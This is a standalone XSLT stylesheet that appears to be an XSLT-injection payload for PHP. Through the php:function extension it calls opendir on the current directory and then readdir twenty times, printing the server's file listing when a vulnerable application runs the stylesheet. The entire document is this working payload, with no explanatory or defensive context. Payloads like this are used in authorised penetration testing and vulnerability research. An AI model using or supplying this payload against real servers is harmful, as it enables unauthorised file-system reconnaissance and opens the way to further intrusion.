<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
    
  <xsl:template match="/">
    <pre>
      <xsl:value-of select="php:function('opendir', '.')"/>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
      <xsl:value-of select="php:function('readdir')"/><xsl:text>&#10;</xsl:text>
    </pre>
  </xsl:template>

</xsl:stylesheet>
